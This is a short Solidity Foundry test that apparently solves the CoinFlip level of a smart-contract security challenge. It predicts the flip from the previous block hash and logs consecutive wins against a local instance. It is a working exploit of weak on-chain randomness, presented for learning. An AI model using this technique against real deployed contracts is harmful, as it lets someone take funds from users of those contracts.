// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/level03.sol";

contract AttackerCoinFlipTest is Test {
    CoinFlip level03 = new CoinFlip();

    function testLevel03() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        level03.flip(blockValue >> 255 == 1);

        console.log("Consecutive Wins: ", level03.consecutiveWins());
    }
}
